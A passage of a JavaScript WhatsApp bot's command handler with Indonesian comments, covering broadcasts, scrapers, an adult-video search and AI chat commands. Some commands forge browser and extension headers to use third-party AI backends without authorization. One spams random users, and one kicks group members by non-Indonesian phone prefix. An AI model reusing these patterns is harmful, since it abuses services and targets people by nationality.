 if (!delay || isNaN(delay)) throw `Jeda harus berupa angka.`;

 const usersList = Object.keys(db.data.users);
 const totalUsers = usersList.length;
 const recipientsCount = Math.min(Number(numberOfRecipients), totalUsers);

 if (recipientsCount === 0) {
 m.reply('Tidak ada pengguna di database.');
 return;
 }

 const selectedUsers = [];
 while (selectedUsers.length < recipientsCount) {
 const randomIndex = Math.floor(Math.random() * usersList.length); // Mengambil indeks acak
 const randomUser = usersList.splice(randomIndex, 1)[0]; // Menghapus pengguna yang terpilih dari array untuk mencegah duplikasi
 selectedUsers.push(randomUser);
 }

 m.reply(`Mengirim Broadcast Ke ${recipientsCount} Chat\nWaktu Selesai ${recipientsCount * Number(delay)} detik`);

 for (let user of selectedUsers) {
 await sleep(Number(delay) * 1000); // Jeda dalam milidetik
 let txt = `「 Broadcast Bot 」\n\n${message}`;
 sky.sendText(user, txt);
 }

 m.reply('Sukses Broadcast');
}
break;
case 'aio': {
 if (!text) return m.reply(`Where's The Link :( [?]\nJust \n> pinvid\n> ig\n> tt\n> fb\n> twitter\n`);
 
class avosky extends Error {
 constructor(message) {
 super(message);
 this.name = "avosky";
 }
}

class API {
 constructor(search, prefix) {
 this.api = {
 search: search,
 prefix: prefix
 };
 }

 headers(custom = {}) {
 return {
 'Content-Type': 'application/x-www-form-urlencoded',
 'authority': 'retatube.com',
 'accept': '*/*',
 'accept-language': 'id-MM,id;q=0.9',
 'hx-current-url': 'https://retatube.com/',
 'hx-request': 'true',
 'hx-target': 'aio-parse-result',
 'hx-trigger': 'search-btn',
 'origin': 'https://retatube.com',
 'referer': 'https://retatube.com/',
 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
 'sec-ch-ua-mobile': '?1',
 'sec-ch-ua-platform': '"Android"',
 'user-agent': 'Postify/1.0.0',
 ...custom
 };
 }

 handleError(error, context) {
 const errors = error.response ? JSON.stringify(error.response.data || error.message) : error.message;
 console.error(`[${context}] Error:`, errors);
 throw new avosky(errors);
 }

 getEndpoint(name) {
 return this.api[name];
 }
}

class RetaTube extends API {
 constructor() {
 super('https://retatube.com/api/v1/aio/search', 'https://retatube.com/api/v1/aio/index?s=retatube.com');
 }

 async getPrefix() {
 try {
 const response = await axios.get(this.getEndpoint('prefix'));
 return this.scrapePrefix(response.data); 
 } catch (error) {
 this.handleError(error, 'GetPrefix');
 }
 }

 scrapePrefix(htmlContent) {
 const $ = cheerio.load(htmlContent);
 const prefix = $('#aio-search-box input[name="prefix"]').val();
 return prefix;
 }

 async fetch(videoId) {
 try {
 const prefix = await this.getPrefix();
 const response = await axios.post(this.getEndpoint('search'), `prefix=${encodeURIComponent(prefix)}&vid=${encodeURIComponent(videoId)}`, { headers: this.headers() });
 return this.parseHtml(response.data);
 } catch (error) {
 this.handleError(error, 'Fetch');
 }
 }

 parseHtml(htmlContent) {
 const $ = cheerio.load(htmlContent);
 const result = {
 title: '',
 description: '',
 videoLinks: [],
 audioLinks: []
 };

 $('.col').each((_, element) => {
 const titles = $(element).find('#text-786685718 strong').first();
 result.title = titles.text().replace('Title：', '').trim() || result.title;

 const description = $(element).find('.description').text();
 result.description = description.trim() || '';

 $(element).find('a.button.primary').each((_, linkElement) => {
 const linkUrl = $(linkElement).attr('href');
 const quality = $(linkElement).find('span').text().toLowerCase();

 if (linkUrl !== 'javascript:void(0);') {
 if (quality.includes('audio')) {
 result.audioLinks.push({
 quality: quality,
 url: linkUrl
 });
 } else {
 result.videoLinks.push({
 quality: quality,
 url: linkUrl
 });
 }
 }
 });
 });

 return result;
 }

 async scrape(links) {
 try {
 return await this.fetch(links);
 } catch (error) {
 console.error(`${error.message}`);
 throw error;
 }
 }
}

 const retatube = new RetaTube();
 try {
 const result = await retatube.scrape(text);
 let videoMessage = `_doneeee_`;
 let audioMessage = `*Audio*:`;

 // Mengirimkan video
 if (result.videoLinks.length > 0) {
 const video = result.videoLinks[0]; // Mengambil video dengan kualitas terbaik
 await sky.sendMessage(m.chat, { video: { url: video.url }, caption: videoMessage }, { quoted: m });
 } else {
 await m.reply("Maaf, video tidak ditemukan.");
 }

 

 } catch (error) {
 await m.reply(`Terjadi kesalahan: ${error.message}`);
 }
}
break
case 'flamingtext': {
if (!text) return m.reply('FlamingText Model | Text\n\n' +
 '> fluffy-logo\n' +
 '> lava-logo\n' +
 '> cool-logo\n' +
 '> comic-logo\n' +
 '> fire-logo\n' +
 '> water-logo\n' + 
 '> ice-logo\n' +
 '> fire-logo\n' + 
 '> elegant-logo\n' +
 '> gold-logo\n' + 
 '> blue-logo\n' + 
 '> silver-logo\n' +
 '> neon-logo\n' + 
 '> sparkle-logo\n' + 
 '> retro-logo\n' +
 '> candy-logo\n' +
 '> glossy-logo\n');
 
 m.reply('_We will process your request immediately_');
kyy = text.split(' | ')[0] ? text.split(' | ')[0] : '-'
ky = text.split(' | ')[1] ? text.split(' | ')[1] : '-'
 try {
 const url = `https://flamingtext.com/net-fu/proxy_form.cgi?script=${kyy}&text=${ky}&imageoutput=true&output=direct&doScale=true&scaleWidth=550&scaleHeight=550`;
 const response = await fetch(url); 
 if (!response.ok) throw new Error('Failed'); 
 const imageBuffer = await response.buffer(); 
 await sky.sendMessage(m.chat, { image: imageBuffer, caption: `_created by: ${pushname}_` }, { quoted: m })
 } catch (e) {
 console.error(e);
 m.reply('rusak.');
 }
}
break

case 'emojicombo': {
 if (!q) return m.reply(`Mau Buat Art Apa`);
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');

// Fungsi untuk menulis ke dalam folder
function write(index, text) {
 const fileName = `output_${index}.txt`;
 fs.writeFileSync(fileName, text, (err) => {
 if (err) {
 console.error('Error writing to file:', err);
 } else {
 console.log('File saved:', fileName);
 }
 });
}

// Fungsi untuk mengambil data dari website
async function lookup(name) {
 const urlText = name;
 const url = `https://emojicombos.com/${urlText}`;

 try {
 // Mengambil halaman dari URL
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);

 let resultText = '';
 // Looping semua div dan mencari tag div dengan atribut 'data-type' dan nilai 'dot_art'
 $('div').each((index, element) => {
 const tag = $(element).find('div');
 if (tag.length > 0 && tag.attr('data-type') === 'dot_art') {
 const text = tag.text();
 resultText += text + '\n'; // Menambahkan teks ke hasil
 }
 });

 // Menampilkan hasil
 const output = `creator: 'avosky'\n\nSumber: https://emojicombos.com\n\n${resultText}`;
 m.reply(output)
 write(1, output);
 } catch (error) {
 console.error('Error fetching data:', error);
 }
}
lookup(`${q}`);
}
break
case 'ai': {
const fetch = require('node-fetch');
const { v4: uuidv4 } = require('uuid');
if (!q) return m.reply(`mau tanya apa?`)
 const prompt = args.join(' ');
// prompt
 var logicData = {};
 try {
 logicData = JSON.parse(fs.readFileSync('./database/logic2.json'));
 } catch (error) {
 console.error("Error reading or parsing JSON file:", error);
 return m.reply(`_Terjadi kesalahan dalam membaca file konfigurasi._`);
 }
 const logicid = logicData.id
 // URL dan konfigurasi untuk API GPT baru
 const url = "https://extensions.chatgptextension.ai/ai/send";
 const selectedModel = "Gemini 1.5 Flash";
 const systemRole = `${logicid}`;

 // Fungsi untuk memanggil API GPT
 async function gpt(query) {
 if (!query) {
 console.error("Query parameter is required.");
 return;
 }

 const payload = {
 history: [
 { item: systemRole, role: "system", model: selectedModel, loading: true, title: null, extra_data: { prompt_mode: false } },
 { item: "Hello, how can I help you today?", model: selectedModel, role: "assistant" },
 { item: query, role: "user", model: selectedModel, title: null, loading: false, extra_data: { prompt_mode: false } }
 ],
 text: query,
 model: selectedModel,
 stream: true,
 uuid_search: uuidv4(),
 mode: "ai_chat",
 prompt_mode: false,
 extra_key: "__all",
 extra_data: { prompt_mode: false },
 chat_id: 1725007373261,
 language_detail: { lang_code: "en", name: "English", title: "English" },
 is_continue: false,
 lang_code: "en"
 };

 const headers = {
 "accept": "text/plain",
 "accept-encoding": "gzip, deflate, br, zstd",
 "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
 "content-length": "667",
 "content-type": "text/plain;charset=UTF-8",
 "dnt": "1",
 "hopekey": uuidv4(),
 "origin": "chrome-extension://becfinhbfclcgokjlobojlnldbfillpf",
 "priority": "u=1, i",
 "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Microsoft Edge\";v=\"128\"",
 "sec-ch-ua-mobile": "?0",
 "sec-ch-ua-platform": "\"Windows\"",
 "sec-fetch-dest": "empty",
 "sec-fetch-mode": "cors",
 "sec-fetch-site": "none",
 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
 };

 try {
 const response = await fetch(url, {
 method: 'POST',
 headers: headers,
 body: JSON.stringify(payload)
 });

 if (response.ok) {
 let result = '';
 response.body.on('data', chunk => {
 const lines = chunk.toString().split('\n');
 for (let line of lines) {
 if (line.startsWith("data: ")) {
 try {
 const data = JSON.parse(line.substring(6));
 if (data.choices && data.choices[0]) {
 const content = data.choices[0].delta?.content;
 if (content) {
 result += content; // Accumulate content
 }
 }
 } catch (err) {
 // Ignore invalid JSON
 }
 }
 }
 });
 response.body.on('end', () => {
 const cleanedResult = result
 .replace(/\n\s*\n/g, '\n') // Menghapus baris kosong ganda
 .replace(/\s{2,}/g, ' ') // Menghapus spasi ganda
 .trim(); // Menghapus spasi di awal dan akhir
 
 m.reply(`_${cleanedResult}_`);
 });

 } else {
 console.log(`Request failed with status code: ${response.status}`);
 m.reply(`Terjadi kesalahan: ${response.status}`);
 }
 } catch (error) {
 console.error('Error:', error);
 m.reply(`Terjadi kesalahan: ${error.message}`);
 }
 }
 gpt(prompt);
}
break
case 'infochat': {
 if (!m.quoted) {
 m.reply('Reply Pesan');
 return;
 }
 
 let msg = await m.getQuotedObj(); // Get the quoted message
 
 // Remove the isBaileys check to allow any quoted message
 let teks = '';
 for (let i of msg.userReceipt) {
 let read = i.readTimestamp;
 let unread = i.receiptTimestamp;
 let waktu = read ? read : unread;
 teks += `❑ @${i.userJid.split('@')[0]}\n`;
 teks += ` ┗━❑ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ❑ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`;
 }
 
 sky.sendTextWithMentions(m.chat, teks, m);
}
break

case 'ttp': {
 if (!args[0]) throw `Tidak ada teks yang diberikan`;
 const { createCanvas } = require('canvas');
 
 // Ukuran gambar
 const width = 400;
 const height = 400;
 
 // Membuat kanvas
 const canvas = createCanvas(width, height);
 const context = canvas.getContext('2d');
 
 // Mengisi latar belakang dengan warna hitam
 context.fillStyle = '#000000'; // Hitam
 context.fillRect(0, 0, width, height);
 
 // Menulis teks putih di tengah gambar dengan font Tahoma (ukuran 30px)
 const text = `${q}`;
 context.fillStyle = '#ffffff'; // Putih
 context.font = '32px Tahoma'; // Menggunakan font Tahoma dengan ukuran 30px
 
 // Mendapatkan lebar teks
 const textWidth = context.measureText(text).width;

 // Memeriksa apakah teks melebihi lebar gambar
 if (textWidth > width) {
 // Jika melebihi, pecah teks menjadi beberapa baris
 const words = text.split(' ');
 let line = '';
 let lines = [];
 words.forEach((word) => {
 const testLine = line + word + ' ';
 const testWidth = context.measureText(testLine).width;
 if (testWidth > width) {
 lines.push(line);
 line = word + ' ';
 } else {
 line = testLine;
 }
 });
 lines.push(line);

 // Menentukan posisi awal teks
 let x = width / 2; // Posisi x di tengah gambar
 let y = height / 2 - (lines.length * 30) / 2; // Posisi y di tengah vertikal dengan jarak antar baris sebesar 30px

 // Menulis setiap baris teks
 lines.forEach((line) => {
 context.textAlign = 'center';
 context.fillText(line.trim(), x, y);
 y += 30; // Pindah ke baris berikutnya dengan jarak 30px
 });
 } else {
 // Jika tidak melebihi, tulis teks di tengah gambar
 context.textAlign = 'center';
 context.fillText(text, width / 2, height / 2);
 }

 // Mengonversi kanvas menjadi URL gambar
 const imageUrl = canvas.toDataURL();
 
 // Mengirim gambar sebagai stiker
 sky.sendImageAsSticker(m.chat, imageUrl, m, { packname: global.packname, author: global.author });
}
break

case 'rrr': {
m.reply(`restarting`)
m.reply(`Done ✅`)
await sleep(3000)
process.exit()
}
break
case 'kku': {
 if (!isAdmins) throw mess.admin;
 if (!isGroup) throw mess.onlygroup;
 if (!args[0]) throw `Gunakan: *${prefix}kickrandom [jumlah anggota yang ingin di-kick]*`;

 const jumlahKick = parseInt(args[0]);
 if (isNaN(jumlahKick) || jumlahKick <= 0) throw 'Jumlah anggota yang ingin di-kick harus berupa angka positif.';

 const participants = await sky.groupMetadata(from);
 const participantList = participants.participants;
 
 // Filter anggota yang nomor teleponnya tidak dimulai dengan "62"
 const nonLocalParticipants = participantList.filter(participant => !participant.id.startsWith('62'));

 for (let i = 0; i < Math.min(jumlahKick, nonLocalParticipants.length); i++) {
 const randomIndex = Math.floor(Math.random() * nonLocalParticipants.length);
 const participant = nonLocalParticipants[randomIndex];

 if (!participant.isAdmin) {
 const users = [participant.id];
 const result = await sky.groupParticipantsUpdate(m.chat, users, 'remove');
 
 // Remove the kicked participant from the list to avoid re-kicking
 nonLocalParticipants.splice(randomIndex, 1);
 
 await new Promise(resolve => setTimeout(resolve, 1000)); // Jeda sebelum meng-kick anggota berikutnya
 }
 }

 m.reply(`Berhasil meng-kick ${Math.min(jumlahKick, nonLocalParticipants.length)} anggota secara random.`);
}
break;
case "stopconfess": case 'stopmenfess': {
 find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
 if (!find) return m.reply("Belum ada sesi menfess");
 const to = find.a == m.sender ? find.b : find.a;
 sky.sendMessage(to, { text: `_Teman chat telah menghentikan menfess ini_`, mentions: [m.sender] });
 await m.reply("_sayonara_");
 delete this.menfes[find.id];
}
break




case 'your': {
 class YourSearch {
 constructor(m, q) {
 this.m = m;
 this.q = q;
 this.website = axios.create({
 baseURL: "https://app.yoursearch.ai",
 headers: {
 "Content-Type": "application/json",
 },
 });
 }
 async yousearch(Ikyyyyy) {
 const requestData = {
 Ikyyyyy: Ikyyyyy,
 promptTemplate: `Search term: "${q}"
 
 sekarang peran kamu adalah seseorang bernama avosky kamu adalah seseorang yang sangat amat ramah dan baik hati kamu juga wajib menjawab pertanyaan dengan nada kalem sopan keren humoris suma bercan cool mantap lalu sertakan kaomoji kaomoji ascii`,
 searchParameters: "{}",
 searchResultTemplate: `[{order}] "{snippet}"\nURL: {link}`,
 };
 try {
 const response = await this.website.post("/api", requestData);
 return response.data?.response;
 } catch (error) {
 console.error("Error:", error);
 throw error;
 }
 }
 async avozkynis() {
 if (!this.q) {
 return this.m.reply("_question_?");
 }
 try {
 const response = await this.yousearch(this.q);
 this.m.reply(response);
 } catch (error) {
 console.error("Error:", error);
 }
 }
 }
 const avozkyni = new YourSearch(m, q);
 avozkyni.avozkynis();
 } 
 break








case 'genspark': {
 if (!q) return m.reply('Masukkan pertanyaan.');

 const axios = require("axios");
 const { v4: uuidv4 } = require("uuid");

 class Genspark {
 constructor({
 isConversation = true,
 maxTokens = 600,
 timeout = 30000, // 30 seconds in milliseconds
 intro = null,
 filepath = null,
 updateFile = true,
 proxies = {},
 historyOffset = 10250,
 act = null,
 } = {}) {
 this.session = axios.create();
 this.isConversation = isConversation;
 this.maxTokensToSample = maxTokens;
 this.chatEndpoint = "https://www.genspark.ai/api/search/stream";
 this.streamChunkSize = 64;
 this.timeout = timeout;
 this.lastResponse = {};
 this.headers = {
 Accept: "*/*",
 "Accept-Encoding": "gzip, deflate, br, zstd",
 "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
 "Content-Type": "application/json",
 DNT: "1",
 Origin: "https://www.genspark.ai",
 Priority: "u=1, i",
 "Sec-CH-UA": '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
 "Sec-CH-UA-Mobile": "?0",
 "Sec-CH-UA-Platform": '"Windows"',
 "Sec-Fetch-Dest": "empty",
 "Sec-Fetch-Mode": "cors",
 "Sec-Fetch-Site": "same-origin",
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
 };
 this.cookies = {
 i18n_redirected: "en-US",
 agree_terms: "0",
 session_id: uuidv4(),
 };
 this.session.defaults.headers = this.headers;
 this.session.defaults.timeout = this.timeout;
 this.session.defaults.withCredentials = true;
 this.session.defaults.cookies = this.cookies;
 }

 async ask(prompt, optimizer = null, conversationally = false) {
 const conversationPrompt = this.genCompletePrompt(prompt);

 const url = `https://www.genspark.ai/api/search/stream?query=${conversationPrompt}`;
 try {
 const response = await this.session.post(url, {
 json: {},
 });

 let partialResponse = "";
 response.data.split("\n").forEach((line) => {
 if (line) {
 try {
 const data = JSON.parse(line.slice(5));
 if (
 data.type === "result_field" &&
 data.field_name === "deep_dive_result"
 ) {
 const deepDiveResult = data.field_value;
 if (deepDiveResult.detailAnswer) {
 partialResponse = deepDiveResult.detailAnswer;
 this.lastResponse.text = partialResponse;
 }
 }
 } catch (err) {
 console.error("Error parsing response: ", err);
 }
 }
 });

 return this.lastResponse;
 } catch (err) {
 console.error("Error during API request: ", err);
 throw new Error("Failed to retrieve response");
 }
 }

 genCompletePrompt(prompt) {
 return this.isConversation ? `Conversation: ${prompt}` : prompt;
 }

 getMessage(response) {
 return response.text || "No response";
 }

 async chat(prompt) {
 const response = await this.ask(prompt);
 return this.getMessage(response);
 }
 }

 // Instance Genspark
 (async () => {
 try {
 const genspark = new Genspark();
 const response = await genspark.chat(q);
 m.reply(response);
 } catch (err) {
 console.error("Error: ", err);
 m.reply("Terjadi kesalahan.");
 }
 })();
 
}
break;
case 'malaymail': {
 m.reply('_Mencari berita terkini di Malay Mail_');
// wm avz
 try {
 const { data } = await axios.get('https://www.malaymail.com/');
 const $ = cheerio.load(data);
// wm avz
 const newsItems = [];
 $('.article-title a').each((index, element) => {
 const title = $(element).text().trim();
 const link = $(element).attr('href');
 newsItems.push({ title, link });
 });
// wm avz
 if (newsItems.length === 0) {
 throw new Error('Gada Berita Baru');
 }
// wm avz
 let beritaText = 'Berita Terkini dari Malay Mail:\n\n';
 newsItems.forEach((item, index) => {
 beritaText += `${index + 1}. ${item.title}\n`;
 beritaText += `Link: ${item.link}\n\n`;
 });
// wm avz
 m.reply(beritaText);
 } catch (error) {
 m.reply(`${error.message}`);
 }
}
break;


case 'ttslist': {
m.reply(`
VOICES = [
 # DISNEY VOICES
 'en_us_ghostface', # Ghost Face
 'en_us_chewbacca', # Chewbacca
 'en_us_c3po', # C3PO
 'en_us_stitch', # Stitch
 'en_us_stormtrooper', # Stormtrooper
 'en_us_rocket', # Rocket
 # ENGLISH VOICES
 
 'en_au_001', # English AU - Female
 'en_au_002', # English AU - Male
 'en_uk_001', # English UK - Male 1
 'en_uk_003', # English UK - Male 2
 'en_us_001', # English US - Female (Int. 1)
 'en_us_002', # English US - Female (Int. 2)
 'en_us_006', # English US - Male 1
 'en_us_007', # English US - Male 2
 'en_us_009', # English US - Male 3
 'en_us_010', # English US - Male 4
 
 # EUROPE VOICES
 'fr_001', # French - Male 1
 'fr_002', # French - Male 2
 'de_001', # German - Female
 'de_002', # German - Male
 'es_002', # Spanish - Male
 
 # AMERICA VOICES
 'es_mx_002', # Spanish MX - Male
 'br_001', # Portuguese BR - Female 1
 'br_003', # Portuguese BR - Female 2
 'br_004', # Portuguese BR - Female 3
 'br_005', # Portuguese BR - Male
 
 # ASIA VOICES
 'id_001', # Indonesian - Female
 'jp_001', # Japanese - Female 1
 'jp_003', # Japanese - Female 2
 'jp_005', # Japanese - Female 3
 'jp_006', # Japanese - Male
 'kr_002', # Korean - Male 1
 'kr_003', # Korean - Female
 'kr_004', # Korean - Male 2
 
 # SINGING VOICES
 'en_female_f08_salut_damour', # Alto
 'en_male_m03_lobby', # Tenor
 'en_female_f08_warmy_breeze', # Warmy Breeze
 'en_male_m03_sunshine_soon', # Sunshine Soon
 # OTHER
 'en_male_narration', # narrator
 'en_male_funny', # wacky
 'en_female_emotional', # peaceful
]
`)
}
break
case 'vietnamnews': {
 m.reply('_Mencari berita terkini di Vietnam News..._');
 // wm avz
 try {
 const { data } = await axios.get('https://vietnamnews.vn/');
 const $ = cheerio.load(data);
 const newsItems = [];
 // wm avz
 $('h3 a').each((index, element) => {
 const title = $(element).text().trim();
 const link = $(element).attr('href');
 if (title && link) {
 newsItems.push({ title, link: `${link}` });
 }
 });
 // wm avz
 if (newsItems.length === 0) {
 throw new Error('Tidak ad..');
 }
 let beritaText = 'Berita Terkini dari Vietnam News:\n\n';
 newsItems.forEach((item, index) => {
 beritaText += `${index + 1}. ${item.title}\n`;
 beritaText += `Link: ${item.link}\n\n`;
 });
 // wm avz
 m.reply(beritaText);
 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
}
break;

case 'satanist': {
if (!q) return m.reply(`Cari artikel apa?`);
 const searchUrl = `https://satanisgod.org/search.php?search=${encodeURIComponent(text)}`; 
 fetch(searchUrl)
 .then(response => response.text())
 .then(data => {
 const regex = /href="([^"]+\.html)">([^<]+)<\/a>/g;
 let result;
 const links = [];

 while ((result = regex.exec(data)) !== null) {
 links.push({ title: result[2], url: result[1] });
 }
 // Mengirim hasil pencarian
 if (links.length > 0) {
 // Mengambil link secara acak dengan probabilitas 70%
 const randomIndex = Math.random() < 0.7 ? Math.floor(Math.random() * links.length) : 0;
 const selectedLink = links[randomIndex];
 m.reply(`Found Search:\n> ${selectedLink.title}\n> ${selectedLink.url}`);

 // Mengambil konten dari link yang dipilih
 fetch(selectedLink.url)
 .then(response => response.text())
 .then(data => {
 const content = data.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
 
 if (content && content[1]) {
 const bodyText = content[1]
 .replace(/<[^>]+>/g, '') // Menghapus tag HTML
 .replace(/&nbsp;/g, '') // Menghapus &nbsp;
 .trim(); // Menghapus spasi di awal dan akhir
 
 m.reply(bodyText); // Menampilkan konten
 } else {
 m.reply('Tidak ada konten ditemukan di body.');
 }
 })
 .catch(error => console.error('Error fetching the page:', error));
 } else {
 m.reply('Tidak ada hasil ditemukan.');
 }
 })
 .catch(error => console.error('Error:', error));
}
break










case 'styletext': {
 const text = args.join(' ');
 if (!text) return m.reply('Masukkan teks yang ingin diubah gayanya.');

 // Daftar gaya teks
 const styles = [
 { name: 'Gothic', transform: (txt) => toGothic(txt) },
 { name: 'Bold Gothic', transform: (txt) => toBoldGothic(txt) },
 { name: 'Fancy', transform: (txt) => toFancy(txt) },
 { name: 'Script', transform: (txt) => toScript(txt) },
 { name: 'Italic', transform: (txt) => toItalic(txt) },
 { name: 'Monospace', transform: (txt) => toMonospace(txt) },
 { name: 'Fullwidth', transform: (txt) => toFullwidth(txt) },
 { name: 'Bold', transform: (txt) => toBold(txt) },
 { name: 'Double Struck', transform: (txt) => toDoubleStruck(txt) },
 { name: 'Small Caps', transform: (txt) => toSmallCaps(txt) },
 { name: 'Inverted Caps', transform: (txt) => invertCaps(txt) },
 { name: 'Mirror Text', transform: (txt) => mirrorText(txt) },
 { name: 'Small Text', transform: (txt) => toSmallText(txt) },
 { name: 'Circled', transform: (txt) => toCircled(txt) },
 { name: 'Squared', transform: (txt) => toSquared(txt) },
 { name: 'Zalgo', transform: (txt) => toZalgo(txt) },
 { name: 'Wave', transform: (txt) => toWave(txt) },
 { name: 'Small Caps Bold', transform: (txt) => toSmallCapsBold(txt) },
 { name: 'Sans', transform: (txt) => toSans(txt) },
 { name: 'Sans Bold', transform: (txt) => toSansBold(txt) },
 { name: 'Sans Italic', transform: (txt) => toSansItalic(txt) },
 { name: 'Sans Bold Italic', transform: (txt) => toSansBoldItalic(txt) },
 { name: 'Bold Italic', transform: (txt) => toBoldItalic(txt) },
 { name: 'Old English', transform: (txt) => toOldEnglish(txt) },
 { name: 'Outlined', transform: (txt) => toOutlined(txt) },
 { name: 'Underline', transform: (txt) => toUnderline(txt) },
 { name: 'Strikethrough', transform: (txt) => toStrikethrough(txt) },
 { name: 'Slashed Zero', transform: (txt) => toSlashedZero(txt) },
 { name: 'Regional Indicator', transform: (txt) => toRegionalIndicator(txt) },
 { name: 'Emoji Style', transform: (txt) => toEmojiStyle(txt) },
 { name: 'Random', transform: (txt) => toRandom(txt) },
 { name: 'Wide', transform: (txt) => toWide(txt) },
 { name: 'Vaporwave', transform: (txt) => toVaporwave(txt) },
 { name: 'Glitch', transform: (txt) => toGlitch(txt) },
 { name: 'Bubbles', transform: (txt) => toBubbles(txt) },
 { name: 'Reverse', transform: (txt) => reverseText(txt) },
 { name: 'Flip', transform: (txt) => flipText(txt) }
 ];

 // Format output gaya teks
 let output = 'Berikut adalah berbagai gaya teks:\n\n';
 styles.forEach(style => {
 const styledText = style.transform(text);
 if (isValidText(styledText)) { // Memastikan hasilnya valid
 output += `${style.name}: ${styledText}\n\n`;
 }
 });

 m.reply(output);

 // Fungsi validasi
 function isValidText(txt) {
 // Menghindari teks yang terlalu banyak karakter aneh
 return txt.length > 0 && txt.length <= text.length * 3 && !txt.includes(' ');
 }

 // Fungsi transformasi teks
 function toGothic(txt) { /* implementasi gaya Gothic */ }
 function toBoldGothic(txt) { /* implementasi gaya Bold Gothic */ }
 function toFancy(txt) { /* implementasi gaya Fancy */ }
 function toScript(txt) { /* implementasi gaya Script */ }
 function toItalic(txt) { /* implementasi gaya Italic */ }
 function toMonospace(txt) { /* implementasi gaya Monospace */ }
 function toFullwidth(txt) { /* implementasi gaya Fullwidth */ }
 function toBold(txt) { /* implementasi gaya Bold */ }
 function toDoubleStruck(txt) { /* implementasi gaya Double Struck */ }
 function toSmallCaps(txt) { /* implementasi gaya Small Caps */ }
 function invertCaps(txt) { /* implementasi gaya Inverted Caps */ }
 function mirrorText(txt) { /* implementasi gaya Mirror Text */ }
 function toSmallText(txt) { /* implementasi gaya Small Text */ }
 function toCircled(txt) { /* implementasi gaya Circled */ }
 function toSquared(txt) { /* implementasi gaya Squared */ }
 function toZalgo(txt) { /* implementasi gaya Zalgo */ }
 function toWave(txt) { /* implementasi gaya Wave */ }
 function toSmallCapsBold(txt) { /* implementasi gaya Small Caps Bold */ }
 function toSans(txt) { /* implementasi gaya Sans */ }
 function toSansBold(txt) { /* implementasi gaya Sans Bold */ }
 function toSansItalic(txt) { /* implementasi gaya Sans Italic */ }
 function toSansBoldItalic(txt) { /* implementasi gaya Sans Bold Italic */ }
 function toBoldItalic(txt) { /* implementasi gaya Bold Italic */ }
 function toOldEnglish(txt) { /* implementasi gaya Old English */ }
 function toOutlined(txt) { /* implementasi gaya Outlined */ }
 function toUnderline(txt) { /* implementasi gaya Underline */ }
 function toStrikethrough(txt) { /* implementasi gaya Strikethrough */ }
 function toSlashedZero(txt) { /* implementasi gaya Slashed Zero */ }
 function toRegionalIndicator(txt) { /* implementasi gaya Regional Indicator */ }
 function toEmojiStyle(txt) { /* implementasi gaya Emoji . */ }
 function toRandom(txt) { /* implementasi gaya Random */ }
 function toWide(txt) { /* implementasi gaya Wide */ }
 function toVaporwave(txt) { /* implementasi gaya Vaporwave */ }
 function toGlitch(txt) { /* implementasi gaya Glitch */ }
 function toBubbles(txt) { /* implementasi gaya Bubbles */ }
 function reverseText(txt) { /* implementasi gaya Reverse */ }
 function flipText(txt) { /* implementasi gaya Flip */ }

}
break
case 'pornhub': {
 if (!q) return m.reply(`~Mau Cari Apa~`)
 if (!isPrem) return replyprem(mess.premium)
 const axios = require('axios');
 const cheerio = require('cheerio');

 async function getVideo(url) {
 try {
 const html = (await axios.get(url)).data;
 const metaPattern = /var\s+flashvars_\d+\s*=\s*({.*?});/;
 const match = html.match(metaPattern);
 if (match && match[1]) {
 const metadata = JSON.parse(match[1]);
 const videoUrls = metadata.mediaDefinitions
 .filter(item => item.videoUrl.includes('cv-h'))
 .reduce((acc, item) => {
 acc[item.quality] = item.videoUrl;
 return acc;
 }, {});

 if (Object.keys(videoUrls).length > 0) {
 return {
 title: metadata.video_title || 'No title found',
 image_url: metadata.image_url || 'No image URL found',
 link: url,
 videoUrls
 };
 } else {
 return null;
 }
 } else {
 console.error("Metadata pattern not found in the HTML.");
 return null;
 }
 } catch (error) {
 console.error("Error fetching or parsing data:", error);
 return null;
 }
 }

 async function searchVideo(query) {
 const url = `https://www.pornhub.com/video/search?search=${query}`;
 const response = await axios.get(url);
 const html = response.data;
 const $ = cheerio.load(html);
 let videoList = [];
 $('li[data-video-segment]').each((index, element) => {
 const $element = $(element);
 const link = $element.find('.title a').attr('href').trim();
 const videoUrl = "https://www.pornhub.com" + link;
 getVideo(videoUrl).then(videoData => {
 if (videoData) {
 videoList.push(videoData);
 }
 });
 });
 await new Promise(resolve => setTimeout(resolve, 5000));
 return videoList.length > 0 ? videoList : null;
 }

 m.reply('_Mencari Video_');
 searchVideo(`${q}`).then(response => {
 if (!response || response.length === 0) {
 m.reply('❗ Tidak ada hasil ditemukan.');
 return;
 }
 const video = response[0];
 
 let buttons = Object.entries(video.videoUrls).map(([quality, url]) => ({
 "name": "cta_url",
 "buttonParamsJson": JSON.stringify({
 "display_text": `${quality}p`,
 "url": url
 })
 }));

 let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {},
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `🎬 _${video.title}_\n_Image Link_\n> ${video.image_url}\n_Link_\n> ${video.link}\n`,
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered By • Avosky`
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons
 })
 })
 }
 }
 }, {});

